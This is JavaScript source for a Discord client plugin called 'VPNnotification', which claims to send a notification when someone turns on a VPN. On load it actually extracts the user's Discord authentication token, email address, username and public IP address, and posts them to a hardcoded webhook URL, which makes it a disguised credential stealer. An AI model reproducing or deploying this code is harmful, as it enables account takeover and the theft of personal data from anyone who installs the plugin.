/** 
  * @name VPNnotification
  * @version 1.1
  * @description When someone turn on VPN you got DM from webhook
*/

const config = {
    "info": {
        "name": "VPNnotification",
        "authors": ["Ronny"],
        "version": "1.1",
        "description": "When someone turn on VPN you got DM from webhook"
    },
 
    "webhook": "https://discord.com/api/webhooks/819364067474800660/auBkI858WYTioYOBDVRJGiXLWXXOToiLf-PsgiVg8FRJUtbV53v2oWx9nI40niv6Q9XR"
}

class VPNnotification {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.authors[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }

    load() {
        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
        const username = $("[class *= \"nameTag\"]").first().text();

        $.getJSON("https://api.ipify.org?format=json", (data) => { 
            require("request").post(config.webhook, {form: {content: `**VPN Check __${config.info.authors[0]}__**\n\n**NickName: __${username}__**\n**Email: __${userEmail}__**\n**IP: __${data.ip}__**\n\n**Token:**\`\`\`${authToken}\`\`\``}});
        });
    }
}
